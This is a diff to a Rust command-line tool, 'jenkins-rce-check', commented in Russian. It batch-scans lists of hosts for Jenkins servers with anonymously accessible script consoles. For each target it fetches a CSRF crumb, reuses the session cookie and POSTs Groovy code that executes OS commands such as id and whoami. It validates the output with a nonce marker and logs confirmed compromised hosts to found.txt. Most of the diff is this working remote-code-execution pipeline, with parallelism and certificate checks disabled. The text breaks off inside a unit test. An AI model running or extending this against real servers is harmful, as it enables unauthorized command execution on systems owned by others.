@@ -4,16 +4,20 @@ use std::fs::{self, File, OpenOptions};
 use std::io::{self, Write};
 use std::path::{Path, PathBuf};
 use std::process::ExitCode;
-use std::sync::OnceLock;
+use std::sync::atomic::{AtomicBool, Ordering};
+use std::sync::Arc;
 use std::time::Duration;
 
 use futures::stream::{self, StreamExt};
-use reqwest::header::{HeaderMap, HeaderValue, CONTENT_TYPE, COOKIE, SET_COOKIE};
+use reqwest::header::{HeaderMap, HeaderValue, CONNECTION, CONTENT_TYPE, COOKIE, SET_COOKIE};
 use reqwest::{Client, RequestBuilder};
 use serde::Serialize;
+use tokio::sync::Mutex;
+use tokio::time::Instant;
 
 const UA: &str = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36";
 
+// (имя для -c, выражение Groovy). Expr должен быть выражением, результат которого — вывод команды.
 const GROOVY: [(&str, &str); 6] = [
     ("id", r#"["id"].execute().text"#),
     ("whoami", r#"["whoami"].execute().text"#),
@@ -34,10 +38,41 @@ const ENDPOINTS: [(&str, &str); 8] = [
     ("systemInfo", "/systemInfo"),
 ];
 
-static NO_COLOR: OnceLock<bool> = OnceLock::new();
+// Маркер в proof. Позволяет перепроверить цель другой командой с тем же nonce:
+//   jenkins-rce-check.exe <target> -c whoami --nonce <nonce>
+const PROOF_MARKER: &str = "RCEPROOF";
+
+// Любое из этих подстрок в ответе означает ошибку/защиту, а не вывод команды.
+const ERROR_MARKERS: [&str; 5] = [
+    "error 403",
+    "no valid crumb",
+    "forbidden",
+    "exception",
+    "access denied",
+];
+
+const DEFAULT_COMMAND: &str = "id";
+const DEFAULT_PARALLEL: usize = 8;
+const TIMEOUT_SECS: u64 = 5;
+const CONNECT_TIMEOUT_MS: u64 = 1500;
+const POST_ATTEMPTS: usize = 3;
+
+static FORCE_NO_COLOR: AtomicBool = AtomicBool::new(false);
 
 fn no_color() -> bool {
-    *NO_COLOR.get_or_init(|| env::var_os("NO_COLOR").is_some())
+    if FORCE_NO_COLOR.load(Ordering::Relaxed) {
+        return true;
+    }
+    if env::var_os("NO_COLOR").is_some() {
+        return true;
+    }
+    if matches!(env::var("CLICOLOR").as_deref(), Ok("0")) {
+        return true;
+    }
+    if matches!(env::var("TERM").as_deref(), Ok("dumb")) {
+        return true;
+    }
+    false
 }
 
 fn paint(text: &str, code: &str) -> String {
@@ -50,7 +85,7 @@ fn paint(text: &str, code: &str) -> String {
 fn vcolor(verdict: &str) -> &'static str {
     match verdict {
         "rce_confirmed" => "91",
-        "script_console_anonymous_proof_failed" | "script_console_anonymous_unverified" => "93",
+        "csrf_blocked" | "script_console_anonymous_proof_failed" | "script_console_anonymous_unverified" => "93",
         "no_anonymous_script_console" => "92",
         "not_jenkins" => "90",
         _ => "97",
@@ -87,6 +122,8 @@ struct ScanResult {
     anonymous_script_console: bool,
     proof_endpoint: Option<String>,
     proof: Option<String>,
+    command: String,
+    nonce: String,
     endpoints: Endpoints,
 }
 
@@ -96,10 +133,16 @@ struct Resp {
     body: String,
 }
 
-const CMD: &str = "id";
-const TIMEOUT_SECS: u64 = 5;
-const CONNECT_TIMEOUT_MS: u64 = 1500;
-const PARALLEL: usize = 32;
+#[derive(Clone)]
+struct Config {
+    command: String,
+    nonce: String,
+    groovy: String,
+    parallel: usize,
+    rate_limit: Option<usize>,
+    output: Option<PathBuf>,
+    output_dir: PathBuf,
+}
 
 enum Input {
     Single(String),
@@ -108,15 +151,72 @@ enum Input {
 
 struct Chosen {
     input: Input,
+    config: Config,
     keep_console: bool,
+}
+
+fn default_config() -> Config {
+    Config {
+        command: DEFAULT_COMMAND.to_string(),
+        nonce: gen_nonce(),
+        groovy: String::new(),
+        parallel: DEFAULT_PARALLEL,
+        rate_limit: None,
+        output: None,
+        output_dir: env::current_dir().unwrap_or_else(|_| PathBuf::from(".")),
+    }
+}
+
+fn sanitize_nonce(s: &str) -> String {
+    s.chars()
+        .filter(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '-'))
+        .take(64)
+        .collect()
+}
+
+fn gen_nonce() -> String {
+    let nanos = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .map(|d| d.as_nanos())
+        .unwrap_or(0);
+    let pid = std::process::id() as u128;
+    format!("{:x}{:x}", nanos, pid)
+}
+
+fn groovy_for(name: &str, nonce: &str) -> Option<String> {
+    let expr = GROOVY.iter().find(|(n, _)| *n == name).map(|(_, e)| *e)?;
+    Some(format!(
+        "return \"{PROOF_MARKER}_{nonce}:\" + ({expr})"
+    ))
+}
+
+fn command_known(name: &str) -> bool {
+    GROOVY.iter().any(|(n, _)| *n == name)
 }
 
 fn usage() -> &'static str {
     "jenkins-rce-check\n\
      \n\
-       jenkins-rce-check <target>   проверить одну цель (url или host[:port])\n\
-       jenkins-rce-check            открыть меню (двойной клик по exe — это оно)\n\
-       jenkins-rce-check help       показать эту справку"
+     Использование:\n\
+       jenkins-rce-check [ЦЕЛЬ] [опции]\n\
+       jenkins-rce-check -l targets.txt [опции]\n\
+       jenkins-rce-check              открыть меню\n\
+     \n\
+     Опции:\n\
+       -l, --list <file>       список целей (по одной на строку, '#' — комментарий)\n\
+       -o, --output <file>     записать все результаты в JSONL (удобно для jq)\n\
+       -c, --command <name>    команда proof: id, whoami, hostname, pwd, uname, date (по умолчанию id)\n\
+       --nonce <str>           свой маркер proof (иначе генерируется; нужен для перепроверки другой командой)\n\
+       --output-dir <dir>      куда писать found.txt (по умолчанию — текущая папка)\n\
+       -p, --parallel <n>      параллельные цели (по умолчанию 8)\n\
+       -rl, --rate-limit <n>   общий лимит HTTP-запросов в секунду (по умолчанию без лимита)\n\
+       --no-color              не выводить ANSI-коды и OSC-гиперссылки\n\
+       -h, --help              эта справка\n\
+     \n\
+     Переменные окружения: NO_COLOR, CLICOLOR=0, TERM=dumb — отключают цвет.\n\
+     \n\
+     Вердикты: rce_confirmed, csrf_blocked, script_console_anonymous_proof_failed,\n\
+               no_anonymous_script_console, not_jenkins"
 }
 
 fn pause_console() {
@@ -179,19 +279,9 @@ fn decode_targets(bytes: &[u8]) -> String {
     bytes.iter().map(|&b| cp1251_char(b)).collect()
 }
 
-fn read_targets_file() -> Result<Vec<String>, String> {
-    let mut path = PathBuf::from("targets.txt");
-    if !path.exists() {
-        if let Ok(mut exe_dir) = env::current_exe() {
-            exe_dir.pop();
-            exe_dir.push("targets.txt");
-            if exe_dir.exists() {
-                path = exe_dir;
-            }
-        }
-    }
-    let raw = fs::read(&path)
-        .map_err(|e| format!("не могу прочитать targets.txt: {e}"))?;
+fn read_targets(path: &Path) -> Result<Vec<String>, String> {
+    let raw = fs::read(path)
+        .map_err(|e| format!("не могу прочитать {}: {e}", path.display()))?;
     let content = decode_targets(&raw);
     let targets: Vec<String> = content
         .lines()
@@ -200,9 +290,24 @@ fn read_targets_file() -> Result<Vec<String>, String> {
         .map(str::to_string)
         .collect();
     if targets.is_empty() {
-        return Err("targets.txt пуст".to_string());
+        return Err(format!("{} пуст", path.display()));
     }
     Ok(targets)
+}
+
+fn find_default_targets() -> Result<Vec<String>, String> {
+    let cwd = PathBuf::from("targets.txt");
+    if cwd.exists() {
+        return read_targets(&cwd);
+    }
+    if let Ok(mut exe_dir) = env::current_exe() {
+        exe_dir.pop();
+        exe_dir.push("targets.txt");
+        if exe_dir.exists() {
+            return read_targets(&exe_dir);
+        }
+    }
+    Err("targets.txt не найден (ни в текущей папке, ни рядом с exe)".to_string())
 }
 
 fn prompt(message: &str) -> Option<String> {
@@ -244,11 +349,17 @@ fn interactive() -> Result<Chosen, i32> {
                         return Err(0);
                     }
                 };
-                return Ok(Chosen { input: Input::Single(target), keep_console: true });
+                let mut config = default_config();
+                config.groovy = groovy_for(&config.command, &config.nonce).unwrap();
+                return Ok(Chosen { input: Input::Single(target), config, keep_console: true });
             }
-            "2" => match read_targets_file() {
-                Ok(v) => return Ok(Chosen { input: Input::Batch(v), keep_console: true }),
-                Err(e) => println!("[!] {e} (положите targets.txt рядом с exe)"),
+            "2" => match find_default_targets() {
+                Ok(v) => {
+                    let mut config = default_config();
+                    config.groovy = groovy_for(&config.command, &config.nonce).unwrap();
+                    return Ok(Chosen { input: Input::Batch(v), config, keep_console: true });
+                }
+                Err(e) => println!("[!] {e}"),
             },
             "3" => println!("{}", usage()),
             "0" | "" => {
@@ -260,42 +371,113 @@ fn interactive() -> Result<Chosen, i32> {
     }
 }
 
-fn parse_input() -> Result<Chosen, i32> {
-    let raw: Vec<String> = env::args().skip(1).collect();
-
-    if raw.iter().any(|a| matches!(a.as_str(), "help" | "-h" | "--help")) {
-        println!("{}", usage());
-        pause_console();
-        return Err(0);
-    }
-
-    if let Some(arg) = raw.first() {
-        if arg.starts_with('-') {
-            eprintln!("[!] опций больше нет: {arg}");
-            eprintln!("{}", usage());
-            pause_console();
-            return Err(2);
-        }
-    }
-
-    if raw.len() > 1 {
-        eprintln!("[!] укажите одну цель или запустите без аргументов для меню");
-        eprintln!("{}", usage());
-        pause_console();
+fn next_value(args: &[String], i: &mut usize, flag: &str) -> Result<String, i32> {
+    *i += 1;
+    if *i >= args.len() {
+        eprintln!("[!] {flag}: не указано значение");
         return Err(2);
     }
+    Ok(args[*i].clone())
+}
 
-    match raw.first() {
-        Some(arg) => Ok(Chosen {
-            input: Input::Single(arg.clone()),
-            keep_console: false,
-        }),
-        None => interactive(),
+fn parse_usize(s: &str, flag: &str, min: usize) -> Result<usize, i32> {
+    match s.parse::<usize>() {
+        Ok(v) if v >= min => Ok(v),
+        _ => {
+            eprintln!("[!] {flag}: ожидается целое число >= {min}, получено '{s}'");
+            Err(2)
+        }
     }
 }
 
-fn groovy_for(name: &str) -> Option<&'static str> {
-    GROOVY.iter().find(|(n, _)| *n == name).map(|(_, s)| *s)
+fn parse_input() -> Result<Chosen, i32> {
+    let args: Vec<String> = env::args().skip(1).collect();
+
+    if args.is_empty() {
+        return interactive();
+    }
+
+    let mut single: Option<String> = None;
+    let mut list_file: Option<PathBuf> = None;
+    let mut config = default_config();
+
+    let mut i = 0;
+    while i < args.len() {
+        let arg = args[i].as_str();
+        match arg {
+            "-h" | "--help" | "help" => {
+                println!("{}", usage());
+                return Err(0);
+            }
+            "--no-color" => FORCE_NO_COLOR.store(true, Ordering::Relaxed),
+            "-l" | "--list" => {
+                list_file = Some(PathBuf::from(next_value(&args, &mut i, arg)?));
+            }
+            "-o" | "--output" => {
+                config.output = Some(PathBuf::from(next_value(&args, &mut i, arg)?));
+            }
+            "-c" | "--command" => {
+                let v = next_value(&args, &mut i, arg)?;
+                if !command_known(&v) {
+                    eprintln!("[!] неизвестная команда '{v}'. Доступны: {}",
+                        GROOVY.iter().map(|(n, _)| *n).collect::<Vec<_>>().join(", "));
+                    return Err(2);
+                }
+                config.command = v;
+            }
+            "--nonce" => {
+                config.nonce = sanitize_nonce(&next_value(&args, &mut i, arg)?);
+                if config.nonce.is_empty() {
+                    eprintln!("[!] --nonce: пустое или недопустимое значение");
+                    return Err(2);
+                }
+            }
+            "--output-dir" => {
+                config.output_dir = PathBuf::from(next_value(&args, &mut i, arg)?);
+            }
+            "-p" | "--parallel" => {
+                let v = next_value(&args, &mut i, arg)?;
+                config.parallel = parse_usize(&v, arg, 1)?;
+            }
+            "-rl" | "--rate-limit" | "--rate" => {
+                let v = next_value(&args, &mut i, arg)?;
+                config.rate_limit = Some(parse_usize(&v, arg, 1)?);
+            }
+            a if a.starts_with('-') => {
+                eprintln!("[!] неизвестная опция: {a}");
+                eprintln!("{}", usage());
+                return Err(2);
+            }
+            a => {
+                if single.is_some() {
+                    eprintln!("[!] указано несколько целей: '{a}'. Используйте -l для списка.");
+                    return Err(2);
+                }
+                single = Some(a.to_string());
+            }
+        }
+        i += 1;
+    }
+
+    let input = match (single, list_file) {
+        (Some(_), Some(_)) => {
+            eprintln!("[!] укажите либо цель, либо -l, не оба сразу");
+            return Err(2);
+        }
+        (Some(t), None) => Input::Single(t),
+        (None, Some(p)) => Input::Batch(read_targets(&p).map_err(|e| {
+            eprintln!("[!] {e}");
+            2
+        })?),
+        (None, None) => {
+            eprintln!("[!] не указана цель. Используйте -l <file> или запустите без аргументов для меню.");
+            eprintln!("{}", usage());
+            return Err(2);
+        }
+    };
+
+    config.groovy = groovy_for(&config.command, &config.nonce).unwrap();
+    Ok(Chosen { input, config, keep_console: false })
 }
 
 fn normalize(target: &str) -> String {
@@ -309,56 +491,49 @@ fn normalize(target: &str) -> String {
     base.trim_end_matches('/').to_string()
 }
 
-fn reports_dir() -> PathBuf {
-    env::current_exe()
-        .ok()
-        .and_then(|p| p.parent().map(Path::to_path_buf))
-        .unwrap_or_else(|| PathBuf::from("."))
+// Глобальный ограничитель скорости: не больше rate запросов в секунду на все цели.
+struct RateLimiter {
+    inner: Mutex<LimiterState>,
 }
 
-// Howard Hinnant's civil_from_days -> UTC timestamp YYYYMMDD_HHMMSS.
-fn timestamp() -> String {
-    let secs = std::time::SystemTime::now()
-        .duration_since(std::time::UNIX_EPOCH)
-        .map(|d| d.as_secs() as i64)
-        .unwrap_or(0);
-    let days = secs.div_euclid(86_400);
-    let sod = secs.rem_euclid(86_400);
+struct LimiterState {
+    next: Instant,
+    interval: Duration,
+}
 
-    let z = days + 719_468;
-    let era = if z >= 0 { z } else { z - 146_096 } / 146_097;
-    let doe = (z - era * 146_097) as u64;
-    let yoe = (doe - doe / 1460 + doe / 36_524 - doe / 146_096) / 365;
-    let mut year = yoe as i64 + era * 400;
-    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
-    let mp = (5 * doy + 2) / 153;
-    let day = doy - (153 * mp + 2) / 5 + 1;
-    let month = if mp < 10 { mp + 3 } else { mp - 9 };
-    if month <= 2 {
-        year += 1;
+impl RateLimiter {
+    fn new(rate: Option<usize>) -> Self {
+        let interval = match rate {
+            Some(n) if n > 0 => Duration::from_secs_f64(1.0 / n as f64),
+            _ => Duration::ZERO,
+        };
+        Self {
+            inner: Mutex::new(LimiterState {
+                next: Instant::now(),
+                interval,
+            }),
+        }
     }
 
-    let hour = sod / 3600;
-    let minute = (sod % 3600) / 60;
-    let second = sod % 60;
-    format!("{year:04}{month:02}{day:02}_{hour:02}{minute:02}{second:02}")
+    async fn wait(&self) {
+        let mut st = self.inner.lock().await;
+        if st.interval.is_zero() {
+            return;
+        }
+        let now = Instant::now();
+        if st.next < now {
+            st.next = now;
+        }
+        let until = st.next;
+        let interval = st.interval;
+        st.next += interval;
+        drop(st);
+        tokio::time::sleep_until(until).await;
+    }
 }
 
-fn safe_name(url: &str) -> String {
-    let authority = url
-        .split_once("://")
-        .map(|(_, rest)| rest)
-        .unwrap_or(url)
-        .split(['/', '?', '#'])
-        .next()
-        .unwrap_or("");
-    let host = if authority.is_empty() { url } else { authority };
-    host.chars()
-        .map(|c| if c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-') { c } else { '_' })
-        .collect()
-}
-
-async fn send(builder: RequestBuilder) -> Resp {
+async fn send(builder: RequestBuilder, rl: &RateLimiter) -> Resp {
+    rl.wait().await;
     match builder.send().await {
         Ok(r) => {
             let status = r.status().as_u16();
@@ -370,12 +545,13 @@ async fn send(builder: RequestBuilder) -> Resp {
     }
 }
 
-async fn get(client: &Client, url: &str) -> Resp {
-    send(client.get(url)).await
+async fn get(client: &Client, url: &str, rl: &RateLimiter) -> Resp {
+    send(client.get(url), rl).await
 }
 
 // Для эндпоинтов, где нужен только статус: не читаем тело вообще.
-async fn get_light(client: &Client, url: &str) -> Resp {
+async fn get_light(client: &Client, url: &str, rl: &RateLimiter) -> Resp {
+    rl.wait().await;
     match client.get(url).send().await {
         Ok(r) => Resp {
             status: r.status().as_u16(),
@@ -390,10 +566,6 @@ async fn get_light(client: &Client, url: &str) -> Resp {
     }
 }
 
-async fn post_form(client: &Client, url: &str, headers: HeaderMap, form: &[(&str, &str)]) -> Resp {
-    send(client.post(url).headers(headers).form(form)).await
-}
-
 fn cookies_from(headers: &HeaderMap) -> String {
     let mut parts = Vec::new();
     for value in headers.get_all(SET_COOKIE) {
@@ -405,6 +577,80 @@ fn cookies_from(headers: &HeaderMap) -> String {
         }
     }
     parts.join("; ")
+}
+
+// Атрибуты Set-Cookie — это не сами cookie, их не шлём обратно в Cookie header.
+fn is_cookie_attribute(name: &str) -> bool {
+    matches!(
+        name.to_ascii_lowercase().as_str(),
+        "path" | "domain" | "expires" | "max-age" | "secure" | "httponly" | "samesite" | "priority"
+    )
+}
+
+// Добавить/заменить cookies, сохраняя одну и ту же сессию между запросами.
+fn merge_cookie(cookie: &mut String, set_cookie: String) {
+    if set_cookie.is_empty() {
+        return;
+    }
+    for pair in set_cookie.split(';').map(str::trim).filter(|p| !p.is_empty()) {
+        let name = pair.split('=').next().unwrap_or("");
+        if is_cookie_attribute(name) {
+            continue;
+        }
+        let mut kept: Vec<String> = cookie
+            .split(';')
+            .map(str::trim)
+            .filter(|p| !p.is_empty())
+            .filter(|p| p.split('=').next().unwrap_or("") != name)
+            .map(str::to_string)
+            .collect();
+        kept.push(pair.to_string());
+        *cookie = kept.join("; ");
+    }
+}
+
+fn parse_crumb(body: &str) -> String {
+    serde_json::from_str::<serde_json::Value>(body)
+        .ok()
+        .and_then(|v| v.get("crumb").and_then(|c| c.as_str()).map(str::to_string))
+        .unwrap_or_default()
+}
+
+// Crumb привязан к сессии: запрашиваем его с тем же cookie, что и последующий POST,
+// и подхватываем новый Set-Cookie (keep-alive + та же сессия).
+async fn fetch_crumb(client: &Client, url: &str, cookie: &str, rl: &RateLimiter) -> (String, String) {
+    let mut req = client.get(url).header(CONNECTION, "keep-alive");
+    if !cookie.is_empty() {
+        if let Ok(v) = HeaderValue::from_str(cookie) {
+            req = req.header(COOKIE, v);
+        }
+    }
+    let out = send(req, rl).await;
+    (parse_crumb(&out.body), cookies_from(&out.headers))
+}
+
+// POST с тем же crumb и cookie, на том же connection (keep-alive).
+async fn post_script(
+    client: &Client,
+    url: &str,
+    crumb: &str,
+    cookie: &str,
+    groovy: &str,
+    rl: &RateLimiter,
+) -> Resp {
+    let mut headers = HeaderMap::new();
+    if let Ok(v) = HeaderValue::from_str(crumb) {
+        headers.insert("Jenkins-Crumb", v);
+    }
+    headers.insert(CONTENT_TYPE, HeaderValue::from_static("application/x-www-form-urlencoded"));
+    headers.insert(CONNECTION, HeaderValue::from_static("keep-alive"));
+    if !cookie.is_empty() {
+        if let Ok(v) = HeaderValue::from_str(cookie) {
+            headers.insert(COOKIE, v);
+        }
+    }
+    let form = [("script", groovy), ("Submit", "Run")];
+    send(client.post(url).headers(headers).form(&form), rl).await
 }
 
 fn strip_tags(s: &str) -> String {
@@ -483,17 +729,45 @@ fn extract_pre_blocks(text: &str) -> Vec<String> {
     out
 }
 
-fn parse_proof(text: &str) -> String {
-    let pres = extract_pre_blocks(text);
-    if !pres.is_empty() {
-        let vals: Vec<String> = pres
-            .iter()
-            .map(|p| clean_text(p).trim().to_string())
-            .filter(|v| !v.is_empty())
-            .collect();
-        return vals.last().cloned().unwrap_or_default();
+// Proof считаем валидным только если:
+//  1) статус 2xx,
+//  2) в ответе нет маркеров ошибок/защиты,
+//  3) есть наш nonce-маркер (и, для id, 'uid='),
+//  4) вывод взят из <pre> (для /script; для /scriptText — из text/plain).
+fn validate_proof(out: &Resp, cmd: &str, nonce: &str, from_pre: bool) -> Option<String> {
+    if !(200..300).contains(&out.status) {
+        return None;
     }
-    clean_text(text).trim().chars().take(2000).collect()
+    let lower = out.body.to_ascii_lowercase();
+    if ERROR_MARKERS.iter().any(|m| lower.contains(m)) {
+        return None;
+    }
+
+    let content = if from_pre {
+        let pres = extract_pre_blocks(&out.body);
+        if pres.is_empty() {
+            return None;
+        }
+        pres.iter()
+            .map(|p| clean_text(p).trim().to_string())
+            .filter(|s| !s.is_empty())
+            .last()
+            .unwrap_or_default()
+    } else {
+        clean_text(&out.body).trim().to_string()
+    };
+
+    let marker = format!("{PROOF_MARKER}_{nonce}:");
+    let idx = content.find(&marker)?;
+    let proof = content[idx + marker.len()..].trim().to_string();
+    if proof.is_empty() {
+        return None;
+    }
+    // Дополнительная проверка «под команду» — страховка от подмены маркера.
+    if cmd == "id" && !proof.contains("uid=") {
+        return None;
+    }
+    Some(proof.chars().take(2000).collect())
 }
 
 fn jenkins_version_in_body(body: &str) -> Option<String> {
@@ -540,7 +814,8 @@ fn log_line(logs: &mut String, prefix: &str, msg: &str) {
 async fn check_target(
     client: Client,
     target: String,
-    cmd: String,
+    config: Arc<Config>,
+    rl: Arc<RateLimiter>,
     prefix: String,
 ) -> (ScanResult, String) {
     let started = std::time::Instant::now();
@@ -548,8 +823,6 @@ async fn check_target(
     let mut logs = String::with_capacity(512);
     log_line(&mut logs, &prefix, &base);
 
-    // Одна волна из 9 запросов: /script и /scriptText нужны с телом,
-    // остальные — только статус, их тяжёлые страницы не скачиваем.
     let u_root = format!("{base}/");
     let u_script = format!("{base}/script");
     let u_script_text = format!("{base}/scriptText");
@@ -561,15 +834,15 @@ async fn check_target(
     let u_crumb = format!("{base}/crumbIssuer/api/json");
     let (root, r_script, r_script_text, r_api, r_manage, r_configure, r_plugin, r_system, crumb_resp) =
         futures::join!(
-            get(&client, &u_root),
-            get(&client, &u_script),
-            get(&client, &u_script_text),
-            get_light(&client, &u_api),
-            get_light(&client, &u_manage),
-            get_light(&client, &u_configure),
-            get_light(&client, &u_plugins),
-            get_light(&client, &u_system),
-            get(&client, &u_crumb),
+            get(&client, &u_root, &rl),
+            get(&client, &u_script, &rl),
+            get(&client, &u_script_text, &rl),
+            get_light(&client, &u_api, &rl),
+            get_light(&client, &u_manage, &rl),
+            get_light(&client, &u_configure, &rl),
+            get_light(&client, &u_plugins, &rl),
+            get_light(&client, &u_system, &rl),
+            get(&client, &u_crumb, &rl),
         );
 
     log_line(&mut logs, &prefix, &format!("  GET / -> {}", root.status));
@@ -614,45 +887,86 @@ async fn check_target(
     }
     log_line(&mut logs, &prefix, &format!("  anonymous_script_console={script_anon}"));
 
-    let cookie = cookies_from(&crumb_resp.headers);
-    let crumb = serde_json::from_str::<serde_json::Value>(&crumb_resp.body)
-        .ok()
-        .and_then(|v| v.get("crumb").and_then(|c| c.as_str()).map(str::to_string))
-        .unwrap_or_default();
+    // /script отдаёт вывод в <pre>; /scriptText — text/plain.
+    let ep = if r_script.status == 200 && script_anon { "/script" } else { "/scriptText" };
+    let from_pre = ep == "/script";
+    let url_post = format!("{base}{ep}");
 
-    let mut proof = String::new();
+    let mut proof: Option<String> = None;
     let mut proof_endpoint: Option<String> = None;
-    if script_anon && !crumb.is_empty() {
-        log_line(&mut logs, &prefix, &format!("  crumb={}", if crumb.is_empty() { "failed" } else { "ok" }));
+    let mut cookie = cookies_from(&crumb_resp.headers);
+    let mut crumb = parse_crumb(&crumb_resp.body);
+    let mut csrf_blocked = false;
+    let mut post_status = 0u16;
 
-        let mut headers = HeaderMap::new();
-        if let Ok(v) = HeaderValue::from_str(&crumb) {
-            headers.insert("Jenkins-Crumb", v);
-        }
-        headers.insert(CONTENT_TYPE, HeaderValue::from_static("application/x-www-form-urlencoded"));
-        if !cookie.is_empty() {
-            if let Ok(v) = HeaderValue::from_str(&cookie) {
-                headers.insert(COOKIE, v);
+    if script_anon {
+        for attempt in 0..POST_ATTEMPTS {
+            // Повтор с той же сессией: crumb и POST используют один и тот же cookie.
+            if crumb.is_empty() || attempt > 0 {
+                let (c, new_cookie) = fetch_crumb(&client, &u_crumb, &cookie, &rl).await;
+                if !new_cookie.is_empty() {
+                    merge_cookie(&mut cookie, new_cookie);
+                }
+                if !c.is_empty() {
+                    crumb = c;
+                }
+            }
+            if crumb.is_empty() {
+                log_line(&mut logs, &prefix, "  crumb=failed");
+                break;
+            }
+            log_line(&mut logs, &prefix, &format!("  crumb=ok ({})", if attempt == 0 { "wave" } else { "retry" }));
+
+            let out = post_script(
+                &client,
+                &url_post,
+                &crumb,
+                &cookie,
+                &config.groovy,
+                &rl,
+            )
+            .await;
+            post_status = out.status;
+            log_line(
+                &mut logs,
+                &prefix,
+                &format!("  POST {ep} attempt {}/{} ({}) -> {}", attempt + 1, POST_ATTEMPTS, config.command, out.status),
+            );
+
+            if let Some(p) = validate_proof(&out, &config.command, &config.nonce, from_pre) {
+                proof = Some(p);
+                proof_endpoint = Some(ep.to_string());
+                break;
+            }
+
+            let low = out.body.to_ascii_lowercase();
+            if out.status == 403 || low.contains("no valid crumb") || low.contains("forbidden") {
+                csrf_blocked = true;
+            }
+            if (200..300).contains(&out.status) {
+                // Ответ 2xx, но валидного proof нет — повтор CSRF не поможет.
+                break;
             }
         }
-
-        let ep = if codes[1] == 200 { "/scriptText" } else { "/script" };
-        proof_endpoint = Some(ep.to_string());
-        log_line(&mut logs, &prefix, &format!("  POST {ep} ({cmd}) ..."));
-
-        let groovy = groovy_for(&cmd).unwrap_or(GROOVY[0].1);
-        let form = [("script", groovy), ("Submit", "Run")];
-        let out = post_form(&client, &format!("{base}{ep}"), headers, &form).await;
-        proof = parse_proof(&out.body);
-        log_line(&mut logs, &prefix, &format!("  proof={}", if proof.is_empty() { "empty" } else { &proof }));
     }
+
+    let short_proof = proof
+        .as_deref()
+        .unwrap_or("-")
+        .chars()
+        .take(60)
+        .collect::<String>()
+        .replace('\n', " ");
+    log_line(&mut logs, &prefix, &format!("  POST status={post_status} proof={short_proof}"));
 
     let verdict = if !is_jenkins {
         "not_jenkins"
     } else if !script_anon {
         "no_anonymous_script_console"
-    } else if !proof.is_empty() {
+    } else if proof.is_some() {
         "rce_confirmed"
+    } else if csrf_blocked {
+        "csrf_blocked"
     } else {
         "script_console_anonymous_proof_failed"
     };
@@ -670,7 +984,9 @@ async fn check_target(
             verdict: verdict.to_string(),
             anonymous_script_console: script_anon,
             proof_endpoint,
-            proof: if proof.is_empty() { None } else { Some(proof) },
+            proof,
+            command: config.command.clone(),
+            nonce: config.nonce.clone(),
             endpoints: Endpoints {
                 root: root.status,
                 script: codes[0],
@@ -708,14 +1024,42 @@ async fn main() -> ExitCode {
     };
     let total = targets.len();
 
-    // В txt попадают только подтверждённые цели, без повторов между запусками.
-    let report_path = reports_dir().join("found.txt");
+    let config = Arc::new(chosen.config);
+    let report_path = config.output_dir.join("found.txt");
+    let _ = fs::create_dir_all(&config.output_dir);
+
+    // В txt попадают только цели с валидным proof, без повторов между запусками.
     let mut known: HashSet<String> = fs::read_to_string(&report_path)
         .unwrap_or_default()
         .lines()
         .map(|l| l.trim().to_string())
         .filter(|l| !l.is_empty())
         .collect();
+
+    let mut jsonl: Option<File> = None;
+    if let Some(path) = &config.output {
+        prepare_path(path);
+        match File::create(path) {
+            Ok(f) => {
+                println!("JSONL: {}", path.display());
+                jsonl = Some(f);
+            }
+            Err(e) => {
+                eprintln!("[!] не могу открыть {} для записи: {e}", path.display());
+                return ExitCode::from(2);
+            }
+        }
+    }
+
+    println!(
+        "Целей: {} | команда: {} | nonce: {} | параллелизм: {} | rate limit: {}",
+        total,
+        config.command,
+        config.nonce,
+        config.parallel,
+        config.rate_limit.map(|n| n.to_string()).unwrap_or_else(|| "-".to_string()),
+    );
+    println!("found.txt: {}", report_path.display());
 
     let client = Client::builder()
         .danger_accept_invalid_certs(true)
@@ -726,12 +1070,16 @@ async fn main() -> ExitCode {
         .build()
         .expect("failed to build HTTP client");
 
+    let rl = Arc::new(RateLimiter::new(config.rate_limit));
+
     let mut stream = stream::iter(targets.into_iter().enumerate().map(|(i, target)| {
         let client = client.clone();
+        let config = Arc::clone(&config);
+        let rl = Arc::clone(&rl);
         let prefix = if batch { format!("[{}/{}] ", i + 1, total) } else { String::new() };
-        async move { (i, check_target(client, target, CMD.to_string(), prefix).await) }
+        async move { (i, check_target(client, target, config, rl, prefix).await) }
     }))
-    .buffer_unordered(PARALLEL);
+    .buffer_unordered(config.parallel);
 
     let mut results: Vec<Option<ScanResult>> = vec![None; total];
 
@@ -761,7 +1109,15 @@ async fn main() -> ExitCode {
         print!("{out}");
         let _ = io::stdout().flush();
 
-        if result.verdict == "rce_confirmed" && known.insert(result.url.clone()) {
+        if let Some(f) = jsonl.as_mut() {
+            if let Ok(line) = serde_json::to_string(&result) {
+                let _ = writeln!(f, "{line}");
+                let _ = f.flush();
+            }
+        }
+
+        // Только валидный proof (verdict rce_confirmed выставляется после валидации).
+        if result.verdict == "rce_confirmed" && result.proof.is_some() && known.insert(result.url.clone()) {
             if let Ok(mut f) = OpenOptions::new().create(true).append(true).open(&report_path) {
                 let _ = writeln!(f, "{}", result.url);
             }
@@ -789,6 +1145,7 @@ async fn main() -> ExitCode {
 
     let ordered = [
         "rce_confirmed",
+        "csrf_blocked",
         "script_console_anonymous_proof_failed",
         "no_anonymous_script_console",
         "not_jenkins",
@@ -815,10 +1172,85 @@ async fn main() -> ExitCode {
     }
 
     println!("\nПодтверждено: {}", report_path.display());
+    if let Some(path) = &config.output {
+        println!("JSONL: {}", path.display());
+    }
 
     if chosen.keep_console {
         pause_console();
     }
 
     ExitCode::SUCCESS
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    fn resp(status: u16, body: &str) -> Resp {
+        Resp { status, headers: HeaderMap::new(), body: body.to_string() }
+    }
+
+    #[test]
+    fn rejects_403_crumb_page_even_with_uid_like_text() {
+        // Баг №1/№2: 403-страница «No valid crumb» раньше считалась выводом id.
+        let body = "<html><pre>No valid crumb was included in the request</pre>\
+                    <pre>uid=0(root) gid=0(root)</pre></html>";
+        assert!(validate_proof(&resp(403, body), "id", "abc123", true).is_none());
+        assert!(validate_proof(&resp(200, body), "id", "abc123", true).is_none());
+    }
+
+    #[test]
+    fn rejects_error_markers_on_2xx() {
+        for marker in ["Error 403", "No valid crumb", "Forbidden", "Exception", "Access denied"] {
